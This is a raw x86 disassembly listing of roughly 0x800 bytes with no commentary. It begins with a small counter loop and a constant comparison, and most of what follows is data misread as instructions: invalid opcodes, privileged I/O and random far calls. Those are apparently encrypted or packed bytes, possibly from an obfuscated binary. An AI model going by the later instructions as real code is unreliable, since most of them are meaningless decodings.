  40287f:	call   DWORD PTR ds:0x42eb58
  402885:	cmp    DWORD PTR ds:0x42e8de,0x7
  40288c:	jne    0x4028a0
  402892:	xor    eax,eax
  402894:	xor    eax,DWORD PTR ds:0x42e8de
  40289a:	dec    eax
  40289b:	mov    ds:0x42e8de,eax
  4028a0:	mov    eax,ds:0x42e8de
  4028a5:	dec    eax
  4028a6:	mov    ds:0x42e8de,eax
  4028ab:	jmp    0x402862
  4028b0:	mov    eax,DWORD PTR [ebp-0x8]
  4028b3:	xor    eax,ecx
  4028b5:	add    eax,esi
  4028b7:	pop    edi
  4028b8:	pop    esi
  4028b9:	pop    ebx
  4028ba:	leave  
  4028bb:	ret    0x4
  4028be:	mov    eax,DWORD PTR [ebp-0xc]
  4028c1:	add    eax,DWORD PTR [ebp-0x18]
  4028c4:	cmp    eax,0x7ad64f9f
  4028c9:	je     0x402c8e
  4028cf:	jmp    0x402c80
  4028d4:	clc    
  4028d5:	inc    edi
  4028d6:	adc    ah,dl
  4028d8:	xchg   ecx,eax
  4028d9:	jge    0x4028d7
  4028db:	pop    ebx
  4028dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028dd:	pop    eax
  4028de:	dec    ebp
  4028df:	push   edi
  4028e0:	jl     0x4028ff
  4028e2:	mov    esi,0x7e03e6c2
  4028e7:	jle    0x40286b
  4028e9:	jno    0x402969
  4028eb:	jle    0x4028b7
  4028ed:	and    al,BYTE PTR [esp+eax*4+0x7]
  4028f1:	ins    BYTE PTR es:[edi],dx
  4028f2:	dec    eax
  4028f3:	nop
  4028f4:	push   edx
  4028f5:	lock adc esi,ebp
  4028f8:	mov    dl,0xe2
  4028fa:	(bad)  
  4028fc:	retf   0x3729
  4028ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402900:	lahf   
  402901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402902:	or     eax,0xea3f48ae
  402907:	pop    ebx
  402908:	imul   esi,DWORD PTR ds:0xfa74f25e,0x77
  40290f:	fidiv  WORD PTR [edi]
  402911:	or     bh,BYTE PTR [edi+0xb]
  402914:	popf   
  402915:	mov    ecx,0xc9660c6b
  40291a:	dec    ebx
  40291b:	cli    
  40291c:	ins    DWORD PTR es:[edi],dx
  40291d:	es ins DWORD PTR es:[edi],dx
  40291f:	out    0x83,al
  402921:	mov    dh,0xca
  402923:	or     al,ch
  402925:	test   al,0xab
  402927:	mov    ebp,DWORD PTR [eax-0xd]
  40292a:	repz mov cs,WORD PTR [edi+0x7f]
  40292e:	lock jno 0x402938
  402931:	repz mov edi,0xb8723c1a
  402937:	in     al,0x20
  402939:	fdivr  QWORD PTR [esi]
  40293b:	sahf   
  40293c:	fisub  WORD PTR [esi]
  40293e:	(bad)  
  40293f:	bnd jae 0x40295f
  402942:	inc    esi
  402943:	mov    ch,0x4f
  402945:	mov    dl,0xeb
  402947:	dec    edi
  402948:	cdq    
  402949:	jg     0x402936
  40294b:	inc    esi
  40294c:	mov    ah,0x12
  40294e:	test   cl,dl
  402950:	dec    ebx
  402951:	fiadd  WORD PTR [esi-0x61]
  402954:	je     0x4028db
  402956:	pop    edi
  402957:	push   0xdfa60f04
  40295c:	pop    esp
  40295d:	ret    0xac44
  402960:	gs scas al,BYTE PTR es:[edi]
  402962:	adc    bl,BYTE PTR [esp+eax*2-0x21]
  402966:	shl    edi,0x2c
  402969:	pop    es
  40296a:	adc    eax,0xc634e858
  40296f:	ja     0x4029b0
  402971:	js     0x402964
  402973:	fisubr WORD PTR [esi]
  402975:	adc    eax,0xce38ba63
  40297a:	fmul   QWORD PTR ds:0x28719db1
  402980:	shl    DWORD PTR [bx+si-0x7ab4],1
  402985:	(bad)  
  402987:	inc    esi
  402988:	adc    al,0x88
  40298a:	arpl   dx,bx
  40298c:	mov    eax,0x76678377
  402991:	clc    
  402992:	(bad)  [eax]
  402994:	or     BYTE PTR [ebx+0x6b6efb51],bl
  40299a:	jnp    0x402995
  40299c:	pop    esi
  40299d:	test   DWORD PTR [edi+0x2d1ea889],0xaaad6def
  4029a7:	fsub   st(7),st
  4029a9:	add    eax,0x165067fb
  4029ae:	ret    0x7119
  4029b1:	xchg   BYTE PTR [esi+0x24],dl
  4029b4:	fldenv [ebx+edx*2]
  4029b7:	imul   edi,DWORD PTR [ebp+0x48],0xffffffb1
  4029bb:	pop    ebp
  4029bc:	aad    0xdf
  4029be:	sbb    DWORD PTR [esi+0x21f87ad2],esp
  4029c4:	pop    edx
  4029c5:	outs   dx,BYTE PTR ds:[esi]
  4029c6:	add    cl,BYTE PTR [ecx]
  4029c8:	in     eax,dx
  4029c9:	dec    edi
  4029ca:	xor    BYTE PTR [eax+ebp*2+0x1b30ddd9],al
  4029d1:	push   edi
  4029d2:	push   edx
  4029d3:	pop    ds
  4029d4:	inc    eax
  4029d5:	ret    0x4e1e
  4029d8:	fst    DWORD PTR [edi-0x63]
  4029db:	and    al,0x95
  4029dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029de:	aaa    
  4029df:	pop    es
  4029e0:	or     DWORD PTR [edx-0x4f0627ce],edi
  4029e6:	push   ebp
  4029e7:	jae    0x402a50
  4029e9:	addr16 cmp eax,0x17b9bb9b
  4029ef:	test   al,0xe3
  4029f1:	pop    edx
  4029f2:	adc    esi,DWORD PTR [esi-0x2]
  4029f5:	jae    0x402a13
  4029f7:	xor    BYTE PTR [eax+0x7a],ah
  4029fa:	xchg   edx,eax
  4029fb:	sub    al,0xcd
  4029fd:	inc    ebp
  4029fe:	xchg   ebx,eax
  4029ff:	mov    cl,0x88
  402a01:	ins    BYTE PTR es:[edi],dx
  402a02:	(bad)  
  402a03:	(bad)  
  402a05:	leave  
  402a06:	jge    0x402a77
  402a08:	jecxz  0x402a53
  402a0a:	or     DWORD PTR [ecx-0x24],esp
  402a0d:	pop    ecx
  402a0e:	lahf   
  402a0f:	mov    ds:0x379d09ef,eax
  402a14:	xor    BYTE PTR [edx],0xce
  402a17:	or     al,0xed
  402a19:	inc    edi
  402a1a:	mov    eax,ds:0x8f8514db
  402a1f:	and    ch,ah
  402a21:	hlt    
  402a22:	jge    0x402a0e
  402a24:	mov    ds:0x73295303,al
  402a29:	sub    BYTE PTR [eax+0x552c7fae],ch
  402a2f:	xchg   ebx,eax
  402a30:	popf   
  402a31:	or     ah,BYTE PTR [ecx-0x7ae2f932]
  402a37:	scas   al,BYTE PTR es:[edi]
  402a38:	inc    edx
  402a39:	sub    bh,BYTE PTR [eax]
  402a3b:	pop    ss
  402a3c:	lods   al,BYTE PTR es:[esi]
  402a3e:	sub    ebx,edi
  402a40:	jmp    0x402a0c
  402a42:	inc    ebp
  402a43:	mov    ah,0x75
  402a45:	not    BYTE PTR [ecx+ebp*2]
  402a48:	arpl   sp,di
  402a4a:	out    dx,al
  402a4b:	rcr    DWORD PTR [eax-0x1f7b2258],cl
  402a51:	cli    
  402a52:	jne    0x402a31
  402a54:	dec    esp
  402a55:	pop    esp
  402a56:	sbb    BYTE PTR es:[ecx],dl
  402a59:	pushf  
  402a5a:	outs   dx,BYTE PTR ds:[esi]
  402a5b:	mov    ebx,0x8074a11
  402a60:	cs fdivp st(0),st
  402a63:	and    eax,0xf0210412
  402a68:	pop    ds
  402a69:	xchg   edi,eax
  402a6a:	jne    0x402a85
  402a6c:	retf   
  402a6d:	stc    
  402a6e:	dec    edi
  402a6f:	retf   
  402a70:	das    
  402a71:	aaa    
  402a72:	sbb    BYTE PTR [ecx+0x61],dl
  402a75:	daa    
  402a76:	dec    eax
  402a77:	scas   eax,DWORD PTR es:[edi]
  402a78:	mov    dh,0xe6
  402a7a:	test   DWORD PTR [ebx+0x1d],0xb1d70f29
  402a81:	in     eax,0x76
  402a83:	popa   
  402a84:	outs   dx,DWORD PTR ds:[esi]
  402a85:	hlt    
  402a86:	or     eax,0xdf2fa6cf
  402a8b:	int    0x1e
  402a8d:	in     eax,dx
  402a8e:	aas    
  402a8f:	xchg   edi,eax
  402a90:	jecxz  0x402a4f
  402a92:	imul   edx,edx,0xb90cbf3d
  402a98:	xor    DWORD PTR [eax-0x7a],ebx
  402a9b:	push   0xffffff91
  402a9d:	loopne 0x402a2a
  402a9f:	xchg   BYTE PTR [ebp+edi*4-0x79],ah
  402aa3:	mov    gs,WORD PTR [edi-0x3ff3ea62]
  402aa9:	pusha  
  402aaa:	and    al,0x9a
  402aac:	inc    eax
  402aad:	std    
  402aae:	add    al,0x40
  402ab0:	lods   eax,DWORD PTR ds:[esi]
  402ab1:	push   es
  402ab2:	push   es
  402ab3:	mov    ecx,0xd7928925
  402ab8:	test   al,0xb0
  402aba:	out    0x7,eax
  402abc:	mov    eax,0xacdd9285
  402ac1:	(bad)  
  402ac2:	ror    BYTE PTR [ebp-0x9],1
  402ac5:	stc    
  402ac6:	cmp    esp,edi
  402ac8:	ret    0xe643
  402acb:	pop    ebp
  402acc:	pushf  
  402acd:	dec    edx
  402ace:	mov    ch,0x16
  402ad0:	scas   al,BYTE PTR es:[edi]
  402ad1:	sbb    DWORD PTR [edx-0x6b],ebp
  402ad4:	sub    eax,0xf78d6153
  402ad9:	daa    
  402ada:	xchg   ebp,eax
  402adb:	push   edx
  402adc:	fcom   st(6)
  402ade:	sbb    BYTE PTR ds:0x9ca97041,cl
  402ae4:	sbb    ecx,ebp
  402ae6:	test   BYTE PTR [esi+0x7f],bl
  402ae9:	ficomp DWORD PTR [edx+0x1b]
  402aec:	enter  0x181c,0xaa
  402af0:	pop    ss
  402af1:	mov    ecx,0xaf15febb
  402af6:	mov    bh,0xff
  402af8:	xor    DWORD PTR [edx+0xa3e5dae],esp
  402afe:	sbb    al,0x28
  402b00:	data16 adc dl,BYTE PTR [ebx+0x69]
  402b04:	call   0xa1b73762
  402b09:	push   ebx
  402b0a:	mov    dl,0xcb
  402b0c:	mov    bh,0x6
  402b0e:	lahf   
  402b0f:	jae    0x402ad6
  402b11:	(bad)  
  402b12:	stc    
  402b13:	icebp  
  402b14:	sbb    edi,DWORD PTR [edi]
  402b16:	cmp    al,0x7f
  402b18:	and    edx,DWORD PTR [eax]
  402b1a:	or     al,bl
  402b1c:	xlat   BYTE PTR ds:[ebx]
  402b1d:	lods   eax,DWORD PTR ds:[esi]
  402b1e:	xchg   edx,eax
  402b1f:	leave  
  402b20:	stc    
  402b21:	test   BYTE PTR [eax-0x16],dh
  402b24:	pop    es
  402b25:	imul   ecx,DWORD PTR [ebp+esi*1-0x672d6749],0x7f
  402b2d:	sbb    ebx,DWORD PTR [edx+eax*8]
  402b30:	xor    edx,ebp
  402b32:	rcl    BYTE PTR [edi+eax*1],0x59
  402b36:	sahf   
  402b37:	jmp    0x50f190d3
  402b3c:	inc    esp
  402b3d:	jp     0x402ae5
  402b3f:	push   cs
  402b40:	and    dh,bh
  402b42:	pop    esp
  402b43:	sti    
  402b44:	fdivr  QWORD PTR [edi+0x36]
  402b47:	inc    edx
  402b48:	sbb    eax,0xff380b1d
  402b4d:	pop    ss
  402b4e:	out    0xaa,al
  402b50:	je     0x402b95
  402b52:	leave  
  402b53:	sub    DWORD PTR [ecx],esi
  402b55:	imul   edi,DWORD PTR [esi],0xffffffca
  402b58:	shr    ch,cl
  402b5a:	lock (bad) 
  402b5c:	pop    ds
  402b5d:	mov    ebp,0x9f04639c
  402b62:	push   0x7fd267a
  402b67:	and    ebp,DWORD PTR [ebp-0x66]
  402b6a:	jl     0x402bb9
  402b6c:	test   DWORD PTR [ebx+0x62],ebp
  402b6f:	pop    edx
  402b70:	aad    0x33
  402b72:	outs   dx,BYTE PTR ds:[esi]
  402b73:	bound  esp,QWORD PTR [eax-0x43]
  402b76:	mov    ds:0x9bd1ec3c,al
  402b7b:	(bad)  
  402b7c:	pop    edx
  402b7d:	aad    0xd0
  402b7f:	int    0xa1
  402b81:	mov    al,ds:0x4261d4af
  402b86:	xchg   esp,eax
  402b87:	jns    0x402b17
  402b89:	aam    0x13
  402b8b:	and    BYTE PTR [eax-0x248b7fe2],cl
  402b91:	mov    ebp,0xdba3b7e
  402b96:	lahf   
  402b97:	rcl    BYTE PTR [ebp-0x7c],1
  402b9a:	push   eax
  402b9b:	xchg   ecx,eax
  402b9c:	call   eax
  402b9e:	mov    bh,BYTE PTR [ebx+0x50c90bf7]
  402ba4:	fs add al,0x96
  402ba7:	int    0x81
  402ba9:	or     esp,eax
  402bab:	cmp    BYTE PTR [ebp-0x2a],bh
  402bae:	push   esp
  402baf:	mul    BYTE PTR ds:0x54484abb
  402bb5:	push   eax
  402bb6:	call   0xc020ddd8
  402bbb:	test   BYTE PTR [ecx+0x21],bh
  402bbe:	pop    ebp
  402bbf:	ss jmp 0x402bc2
  402bc2:	(bad)  
  402bc3:	outs   dx,DWORD PTR ds:[esi]
  402bc4:	jmp    0x402b5a
  402bc6:	call   0x37f5a3ea
  402bcb:	cmp    esp,ebx
  402bcd:	add    edi,esp
  402bcf:	or     bh,bl
  402bd1:	test   eax,0x4ba91494
  402bd6:	div    DWORD PTR [ecx+0x67]
  402bd9:	mov    dh,BYTE PTR [eax]
  402bdb:	or     BYTE PTR [eax],0xe8
  402bde:	int    0x69
  402be0:	dec    ebx
  402be1:	retf   
  402be2:	mov    eax,0x6481341b
  402be7:	inc    esi
  402be8:	pop    es
  402be9:	ret    0x2d00
  402bec:	sar    DWORD PTR [esi+0x12],cl
  402bef:	fbld   TBYTE PTR [esi-0x3077a7c9]
  402bf5:	xor    DWORD PTR [ebx],ebp
  402bf7:	jbe    0x402c60
  402bf9:	or     edi,eax
  402bfb:	ins    DWORD PTR es:[edi],dx
  402bfc:	js     0x402c30
  402bfe:	sub    BYTE PTR [ebp-0x1b],al
  402c01:	pop    edx
  402c02:	call   0x289c:0x7150957
  402c09:	adc    BYTE PTR [ebx],bh
  402c0b:	ss out dx,eax
  402c0d:	std    
  402c0e:	push   0x70
  402c10:	jbe    0x402bfc
  402c12:	push   ss
  402c13:	data16 outs dx,BYTE PTR ds:[esi]
  402c15:	fidiv  WORD PTR [esi]
  402c17:	mov    ch,0x90
  402c19:	dec    ebp
  402c1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c1b:	xchg   edi,eax
  402c1c:	jo     0x402c72
  402c1e:	mov    ah,0x31
  402c20:	mov    dl,0xc9
  402c22:	test   BYTE PTR [esi+0x55bbc072],ah
  402c28:	xchg   ebx,eax
  402c29:	mov    al,0x93
  402c2b:	dec    edx
  402c2c:	iret   
  402c2d:	outs   dx,DWORD PTR ds:[esi]
  402c2e:	test   eax,0xc44fc5d2
  402c33:	psubsb mm3,QWORD PTR [ebx+0x2fbdcd6f]
  402c3a:	jecxz  0x402c9f
  402c3c:	jmp    0x402c72
  402c3e:	cmp    BYTE PTR [ebx-0x48],bh
  402c41:	xlat   BYTE PTR ds:[ebx]
  402c42:	jmp    0x402c03
  402c44:	fst    QWORD PTR [esi+0x6e]
  402c47:	sub    DWORD PTR [esi-0x19],ecx
  402c4a:	jne    0x402c6a
  402c4c:	cmp    eax,0x86b36ad7
  402c51:	int    0xb1
  402c53:	pop    es
  402c54:	inc    edx
  402c55:	(bad)  
  402c56:	mul    DWORD PTR [edi]
  402c58:	adc    BYTE PTR [edi],bh
  402c5a:	es cli 
  402c5c:	mov    cl,0xd7
  402c5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c5f:	daa    
  402c60:	or     al,0x54
  402c62:	jb     0x402cc0
  402c64:	mov    dl,0xe6
  402c66:	xor    al,0x78
  402c68:	and    al,0x9
  402c6a:	push   eax
  402c6b:	retf   
  402c6c:	loop   0x402cb6
  402c6e:	ds jns 0x402c6b
  402c71:	(bad)  
  402c72:	lahf   
  402c73:	outs   dx,BYTE PTR ds:[esi]
  402c74:	pop    ds
  402c75:	(bad)  
  402c76:	cvttps2pi mm6,QWORD PTR [edi-0x1b]
  402c7a:	sub    eax,0x15d6546c
  402c7f:	mov    ebx,0x81f0458b
  402c84:	and    BYTE PTR [ebp-0x16ff8ae4],bl
  402c8a:	retf   0xfffb
  402c8d:	dec    DWORD PTR [ebx+0x558bf445]
  402c93:	call   0xff7deea3
  402c98:	sub    eax,0x840ffabf
  402c9d:	mov    edi,0x8b000003
  402ca2:	inc    ebp
  402ca3:	lock xor DWORD PTR [eax],0x2650fa8f
  402caa:	jmp    0x402858
  402caf:	jmp    0x403060
  402cb4:	adc    al,0x1c
  402cb6:	repnz push edx
  402cb8:	mov    edx,0x415cd47c
  402cbd:	test   dl,cl
  402cbf:	inc    esp
  402cc0:	mov    eax,ds:0xaeb9efb
  402cc5:	pop    es
  402cc6:	jle    0x402d46
  402cc8:	xor    BYTE PTR [ecx+0x7e],0x7e
  402ccc:	xor    BYTE PTR [eax-0x7fe023d0],ch
  402cd2:	dec    edx
  402cd3:	sub    eax,0x21f759a7
  402cd8:	jns    0x402cf8
  402cda:	jl     0x402c9f
  402cdc:	hlt    
  402cdd:	mov    ebp,0x8cdbe4d2
  402ce2:	jle    0x402cee
  402ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ce5:	sahf   
  402ce6:	pop    esp
  402ce7:	ror    DWORD PTR [ecx],1
  402ce9:	imul   ebp,DWORD PTR [eax-0x45],0xffffffd8
  402ced:	and    BYTE PTR [edx-0x5b23e361],bl
  402cf3:	leave  
  402cf4:	xor    eax,0x29338d1c
  402cf9:	mov    dh,0x81
  402cfb:	xor    ch,bl
  402cfd:	out    dx,al
  402cfe:	cmc    
  402cff:	scas   al,BYTE PTR es:[edi]
  402d00:	ret    0x76a0
  402d03:	mov    ch,0xd6
  402d05:	repnz push es
  402d07:	xlat   BYTE PTR ds:[ebx]
  402d08:	test   al,0xf2
  402d0a:	sub    al,ch
  402d0c:	mov    cl,0xd7
  402d0e:	gs call 0x2d4a:0x2de1bc24
  402d16:	sar    DWORD PTR [edx-0x43c289ae],cl
  402d1c:	mov    ebx,0x57aa41c
  402d21:	jbe    0x402cd8
  402d23:	jns    0x402d30
  402d25:	out    0xe6,eax
  402d27:	leave  
  402d28:	arpl   WORD PTR [ebx],di
  402d2a:	cmp    BYTE PTR [ebx],al
  402d2c:	rcl    ebp,0xb3
  402d2f:	add    eax,0x8fa746e6
  402d34:	out    dx,al
  402d35:	add    al,0xdd
  402d37:	pop    eax
  402d38:	test   eax,0xd7ef51c
  402d3d:	cld    
  402d3e:	es (bad) 
  402d40:	out    0x1a,al
  402d42:	push   ds
  402d43:	mov    bl,0x9c
  402d45:	imul   ebx,DWORD PTR [edi],0xffffff93
  402d48:	jp     0x402d5d
  402d4a:	dec    eax
  402d4b:	outs   dx,DWORD PTR ds:[esi]
  402d4c:	fbstp  TBYTE PTR [ebp+ebx*1+0x56]
  402d50:	mov    BYTE PTR [edx+0x60a64c22],bl
  402d56:	into   
  402d57:	aam    0xf3
  402d59:	mov    edx,0x12506b03
  402d5e:	and    eax,eax
  402d60:	dec    edi
  402d61:	ss jmp 0x402da1
  402d64:	mov    ?,esi
  402d66:	sti    
  402d67:	enter  0x300d,0x48
  402d6b:	div    esi
  402d6d:	retf   
  402d6e:	dec    ebp
  402d6f:	cmp    BYTE PTR [eax+0x9bfd5bb],dh
  402d75:	mov    al,ds:0xe64f7c1c
  402d7a:	aam    0xa
  402d7c:	dec    esi
  402d7d:	inc    esp
  402d7e:	call   0xa5fd:0x70e245be
  402d85:	retf   
  402d86:	pop    esi
  402d87:	out    dx,eax
  402d88:	jg     0x402e00
  402d8a:	pop    esp
  402d8b:	rol    esp,1
  402d8d:	dec    esi
  402d8e:	mov    ecx,0x54e38ec2
  402d93:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  402d95:	int3   
  402d96:	xchg   edx,eax
  402d97:	sub    ah,cl
  402d99:	mov    cl,0xbc
  402d9b:	adc    ebp,esi
  402d9d:	mov    edi,0x7d21b16
  402da2:	mov    esi,0xe31f489a
  402da7:	push   ss
  402da8:	retf   0x13bf
  402dab:	mov    esp,0x300eebb0
  402db0:	and    BYTE PTR [ecx+0x786f41fd],bl
  402db6:	(bad)  
  402db8:	inc    esi
  402db9:	push   ecx
  402dba:	cmp    bl,BYTE PTR [ebp*8-0x5480a21b]
  402dc1:	gs enter 0xb031,0x36
  402dc6:	push   ss
  402dc7:	sbb    bl,BYTE PTR [ecx-0x4e464b82]
  402dcd:	test   ah,cl
  402dcf:	add    eax,eax
  402dd1:	push   esp
  402dd2:	aaa    
  402dd3:	xchg   edx,eax
  402dd4:	sbb    ecx,DWORD PTR [ecx+0x21]
  402dd7:	xor    eax,0xfeb73bdc
  402ddc:	arpl   dx,si
  402dde:	stos   DWORD PTR es:[edi],eax
  402ddf:	cmp    bh,bl
  402de1:	mov    ebp,0x8043802f
  402de6:	jmp    0xa150091c
  402deb:	xchg   ebp,eax
  402dec:	pop    esp
  402ded:	or     DWORD PTR [eax],0x73bb78a2
  402df3:	jecxz  0x402dd3
  402df5:	cmp    eax,0xefb1dab2
  402dfa:	pop    edx
  402dfb:	in     al,dx
  402dfc:	jmp    0x7d99f77b
  402e01:	xchg   edi,eax
  402e02:	iret   
  402e03:	das    
  402e04:	lea    edx,[esi-0x21]
  402e07:	inc    ecx
  402e08:	mov    cl,0xc9
  402e0a:	dec    edi
  402e0b:	pop    edx
  402e0c:	test   BYTE PTR [ebp-0x7b],0x7b
  402e10:	jnp    0x402e85
  402e12:	xor    eax,0x2a03812b
  402e17:	lock pushf 
  402e19:	aad    0x1a
  402e1b:	cmc    
  402e1c:	(bad)  
  402e1d:	xchg   edx,eax
  402e1e:	iret   
  402e1f:	scas   al,BYTE PTR es:[edi]
  402e20:	inc    esp
  402e21:	and    eax,0x14fc992f
  402e26:	test   al,0xd2
  402e28:	arpl   WORD PTR [ecx-0x821cc66],ax
  402e2e:	mov    dl,0x85
  402e30:	push   ds
  402e31:	jne    0x402dce
  402e33:	mov    esp,0xda68e08b
  402e38:	adc    al,0x9c
  402e3a:	add    al,0x4e
  402e3c:	sti    
  402e3d:	jmp    0x402dd3
  402e3f:	das    
  402e40:	and    ebx,DWORD PTR [edx-0x301acc5a]
  402e46:	mov    bl,0x90
  402e48:	test   BYTE PTR ds:0x2ab714f4,dh
  402e4e:	pop    ds
  402e4f:	xor    esi,0xf35df96b
  402e55:	mov    esi,0xe4c8a5b9
  402e5a:	imul   ebx,ebx,0x9a081873
  402e60:	mov    al,ds:0x948f9de1
  402e65:	or     BYTE PTR [ebx-0x6e55de25],0x39
  402e6c:	shr    dh,1
  402e6e:	cld    
  402e6f:	lods   al,BYTE PTR ds:[esi]
  402e70:	shr    BYTE PTR [eax-0x7be5e906],1
  402e76:	iret   
  402e77:	or     esp,DWORD PTR [edi]
  402e79:	rcr    DWORD PTR [edi-0x59],1
  402e7c:	sbb    al,0x7c
  402e7e:	xor    al,0xdb
  402e80:	sbb    dl,ah
  402e82:	shr    BYTE PTR [edx-0x5b47b0c4],0x31
  402e89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e8a:	stc    
  402e8b:	sbb    ebp,esi
  402e8d:	ja     0x402ebe
  402e8f:	push   esp
  402e90:	cwde   
  402e91:	xor    DWORD PTR [eax+edi*4],ebx
  402e94:	add    al,0x78
  402e96:	fidivr WORD PTR [eax+ecx*8]
  402e99:	pop    es
  402e9a:	hlt    
  402e9b:	pop    ecx
  402e9c:	push   esi
  402e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e9e:	pop    eax
  402e9f:	cmp    eax,0x8aaabb0b
  402ea4:	aaa    
  402ea5:	mov    ebp,0x6ec6bb4a
  402eaa:	shl    bl,cl
  402eac:	mov    edi,0x89d8124e
  402eb1:	cvtps2pi mm0,QWORD PTR [ebx+0x733fa58d]
  402eb8:	push   ds
  402eb9:	dec    ebp
  402eba:	mov    eax,ds:0x18505a31
  402ebf:	icebp  
  402ec0:	pop    edx
  402ec1:	retf   0x1c8c
  402ec4:	mov    edi,ss
  402ec6:	dec    edi
  402ec7:	test   edi,edi
  402ec9:	mov    esi,0xf6045d03
  402ece:	lock rol BYTE PTR [esi+0x4a],0xb8
  402ed3:	lock arpl bx,bx
  402ed6:	push   ss
  402ed7:	or     BYTE PTR [ecx],al
  402ed9:	mov    cs,eax
  402edb:	ds pop ss
  402edd:	stos   DWORD PTR es:[edi],eax
  402ede:	sub    ch,BYTE PTR [eax+0x575e1199]
  402ee4:	inc    edx
  402ee5:	mov    eax,DWORD PTR [ecx-0x587e276d]
  402eeb:	xchg   DWORD PTR [ebp+0x4a],eax
  402eee:	enter  0xc683,0x72
  402ef2:	and    eax,0x44339eff
  402ef7:	and    eax,0x700e7704
  402efc:	mov    dh,0xe7
  402efe:	mov    ah,0x60
  402f00:	pusha  
  402f01:	push   esi
  402f02:	(bad)  
  402f03:	in     eax,dx
  402f04:	jb     0x402f5e
  402f06:	retf   0x3d0b
  402f09:	sub    edi,edx
  402f0b:	adc    ebx,DWORD PTR [ecx+0x66]
  402f0e:	pop    edx
  402f0f:	dec    BYTE PTR [esi-0x173bdb0b]
  402f15:	push   ecx
  402f16:	in     al,dx
  402f17:	inc    edx
  402f18:	dec    ebp
  402f19:	test   DWORD PTR [ecx+edx*4+0x78],esi
  402f1d:	pushf  
  402f1e:	pop    ebp
  402f1f:	cld    
  402f20:	dec    eax
  402f21:	push   cs
  402f22:	pop    ss
  402f23:	scas   eax,DWORD PTR es:[edi]
  402f24:	hlt    
  402f25:	mov    dl,0x6c
  402f27:	cmp    ebp,eax
  402f29:	push   ss
  402f2a:	popa   
  402f2b:	inc    edx
  402f2c:	pop    es
  402f2d:	jnp    0x402f9d
  402f2f:	xchg   esi,eax
  402f30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f31:	out    0x3b,eax
  402f33:	push   0xad41cdc5
  402f38:	enter  0x60ce,0x79
  402f3c:	jae    0x402f94
  402f3e:	fsub   DWORD PTR [eax+ecx*1+0x19d36bba]
  402f45:	push   ss
  402f46:	dec    esi
  402f47:	mov    ebx,0x442236fc
  402f4c:	aam    0x10
  402f4e:	fcmovne st,st(4)
  402f50:	push   esi
  402f51:	or     ch,BYTE PTR [esi+0x4a87f0fe]
  402f57:	cmp    DWORD PTR [eax],0xffffffd3
  402f5a:	mov    DWORD PTR [esi-0x6711e422],esp
  402f60:	cs lock jge 0x402fdf
  402f64:	push   edi
  402f65:	dec    eax
  402f66:	inc    ebx
  402f67:	push   ds
  402f68:	sub    edi,ecx
  402f6a:	add    bl,BYTE PTR [edi-0x3c]
  402f6d:	scas   eax,DWORD PTR es:[edi]
  402f6e:	mov    al,0xf3
  402f70:	jecxz  0x402fd9
  402f72:	or     al,0xc1
  402f74:	fidiv  WORD PTR [esi]
  402f76:	push   edx
  402f77:	scas   eax,DWORD PTR es:[edi]
  402f78:	xor    eax,esp
  402f7a:	xchg   DWORD PTR [ebx+0x6e],edi
  402f7d:	sbb    ah,BYTE PTR [esi+edx*1]
  402f80:	cdq    
  402f81:	lods   al,BYTE PTR ds:[esi]
  402f82:	xor    bl,BYTE PTR [ebx-0x32]
  402f85:	xor    edi,DWORD PTR [edx+0x0]
  402f88:	cdq    
  402f89:	dec    ebx
  402f8a:	fdiv   st,st(7)
  402f8c:	sub    eax,0xcd2e7508
  402f91:	push   ebp
  402f92:	gs xor edx,ecx
  402f95:	outs   dx,DWORD PTR ds:[esi]
  402f97:	outs   dx,BYTE PTR ds:[esi]
  402f98:	cmp    BYTE PTR [ebx],dh
  402f9a:	jecxz  0x402ff1
  402f9c:	cmp    cl,BYTE PTR [edi+edi*1-0xe94ea3a]
  402fa3:	dec    esi
  402fa4:	sub    al,0x54
  402fa6:	test   DWORD PTR [esi+0x7c],esi
  402fa9:	adc    BYTE PTR [ebx],al
  402fab:	cmp    esi,esp
  402fad:	int3   
  402fae:	sbb    BYTE PTR [edi],bl
  402fb0:	xchg   ch,cl
  402fb2:	outs   dx,DWORD PTR ds:[esi]
  402fb3:	loop   0x402f58
  402fb5:	dec    esi
  402fb6:	xchg   edi,eax
  402fb7:	dec    esp
  402fb8:	outs   dx,BYTE PTR ds:[esi]
  402fb9:	mov    edx,0xc7540abc
  402fbe:	pop    edi
  402fbf:	int3   
  402fc0:	data16 fcmovnu st,st(4)
  402fc3:	cmp    ecx,DWORD PTR [edi-0x17aabe07]
  402fc9:	add    BYTE PTR [esi-0x4b23894e],cl
  402fcf:	jno    0x402f9a
  402fd1:	mul    BYTE PTR [esp+eax*1]
  402fd4:	mov    esi,0x9dc65b1d
  402fd9:	pop    esp
  402fda:	fwait
  402fdb:	es iret 
  402fdd:	inc    ecx
  402fde:	loop   0x40300b
  402fe0:	sub    bh,ah
  402fe2:	div    al
  402fe4:	xchg   ecx,eax
  402fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fe6:	outs   dx,BYTE PTR ds:[esi]
  402fe7:	gs popf 
  402fe9:	dec    esp
  402fea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402feb:	mov    bl,0xa0
  402fed:	push   ss
  402fee:	lods   al,BYTE PTR fs:[esi]
  402ff0:	jae    0x402f9b
  402ff2:	fisubr DWORD PTR [ebp-0x3d]
  402ff5:	mov    ecx,0xc9d881b3
  402ffa:	mov    BYTE PTR [eax+0x3c],dh
  402ffd:	stc    
  402ffe:	shl    BYTE PTR [edx+edi*8-0x64],1
  403002:	jns    0x402fb6
  403004:	test   al,0x90
  403006:	sub    al,0xd0
  403008:	push   es
  403009:	cmp    BYTE PTR [edx+0x20],al
  40300c:	sbb    ebp,DWORD PTR [edi+0x4fc74b92]
  403012:	test   DWORD PTR [ebp-0xd],eax
  403015:	pop    es
  403016:	mov    DWORD PTR [esi+0x4616d186],0x9a34c398
  403020:	dec    eax
